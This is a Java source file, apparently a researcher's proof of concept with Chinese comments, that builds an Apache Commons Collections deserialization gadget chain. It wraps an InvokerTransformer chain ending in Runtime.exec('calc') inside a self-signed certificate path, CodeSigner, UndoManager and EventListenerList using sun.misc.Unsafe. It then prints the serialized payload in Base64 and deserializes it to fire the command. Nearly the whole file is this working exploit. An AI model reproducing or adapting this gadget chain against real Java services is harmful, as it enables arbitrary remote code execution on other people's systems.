import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.list.LazyList;
import org.apache.commons.collections.list.TransformedList;
import org.apache.commons.collections.map.ListOrderedMap;
import sun.misc.Unsafe;
import sun.security.provider.certpath.X509CertPath;
import sun.security.x509.*;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.security.CodeSigner;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.*;

public class test {
    public static X509Certificate generateSelfSignedCertificate() throws Exception {
        // 生成密钥对
        KeyPairGenerator keyGen = KeyPairGenerator.getInstance("RSA");
        keyGen.initialize(2048, new SecureRandom());
        KeyPair keyPair = keyGen.generateKeyPair();

        // 获取当前时间
        Date from = new Date();
        Date to = new Date(from.getTime() + 365 * 24 * 60 * 60 * 1000L); // 1年有效期

        // 创建证书信息
        X500Name owner = new X500Name("CN=example.com, OU=Development, O=Example Inc, L=City, ST=State, C=US");
        X509CertInfo info = new X509CertInfo();

        // 设置证书版本、序列号等信息
        info.set(X509CertInfo.VERSION, new CertificateVersion(CertificateVersion.V3));
        info.set(X509CertInfo.SERIAL_NUMBER, new CertificateSerialNumber(new BigInteger(64, new SecureRandom())));

        // 设置算法ID
        AlgorithmId algo = new AlgorithmId(AlgorithmId.sha256WithRSAEncryption_oid);
        info.set(X509CertInfo.ALGORITHM_ID, new CertificateAlgorithmId(algo));

        // 设置颁发者和所有者
        info.set(X509CertInfo.SUBJECT, owner);
        info.set(X509CertInfo.ISSUER, owner);

        // 设置有效期
        info.set(X509CertInfo.VALIDITY, new CertificateValidity(from, to));

        // 设置公钥
        info.set(X509CertInfo.KEY, new CertificateX509Key(keyPair.getPublic()));

        // 创建证书并签名
        X509CertImpl cert = new X509CertImpl(info);
        cert.sign(keyPair.getPrivate(), "SHA256withRSA");

        return cert;
    }
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        // 生成自签名证书
        X509Certificate cert = generateSelfSignedCertificate();

        // 使用证书创建X509CertImpl对象
        X509CertImpl certImpl = new X509CertImpl(cert.getEncoded());

        System.out.println("证书生成成功！");
        System.out.println("主题: " + cert.getSubjectDN());
        System.out.println("颁发者: " + cert.getIssuerDN());
        System.out.println("有效期: " + cert.getNotBefore() + " 至 " + cert.getNotAfter());

        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(certImpl);
        List decorate1 = TransformedList.decorate(arrayList, chainedTransformer);
        List decorate = LazyList.decorate(decorate1, new ConstantFactory(chainedTransformer));
        HashMap<Object, Object> map = new HashMap<>();
        ListOrderedMap decorated = (ListOrderedMap) ListOrderedMap.decorate(map);
        Field field = Unsafe.class.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get((Object) null);
        unsafe.putObject(decorated, unsafe.objectFieldOffset(ListOrderedMap.class.getDeclaredField("insertOrder")), decorate);
        X509CertPath o = (X509CertPath) unsafe.allocateInstance(X509CertPath.class);
        unsafe.putObject(o, unsafe.objectFieldOffset(X509CertPath.class.getDeclaredField("certs")), decorate);
        Object o1 = unsafe.allocateInstance(CodeSigner.class);
        unsafe.putObject(o1, unsafe.objectFieldOffset(CodeSigner.class.getDeclaredField("signerCertPath")), o);
        EventListenerList list2 = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) getFieldValue(manager, "edits");
        vector.add(o1);
        unsafe.putObject(list2,unsafe.objectFieldOffset(list2.getClass().getDeclaredField("listenerList")),new Object[]{InternalError.class, manager});
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        new ObjectOutputStream(bao).writeObject(list2);
        System.out.println(Base64.getEncoder().encodeToString(bao.toByteArray()));
        ByteArrayInputStream bin = new ByteArrayInputStream(bao.toByteArray());
        new ObjectInputStream(bin).readObject();
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }
    public static Field getField(Class<?> clazz, String fieldName) {
        Field field = null;

        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException var4) {
            if (clazz.getSuperclass() != null) {
                field = getField(clazz.getSuperclass(), fieldName);
            }
        }

        return field;
    }
}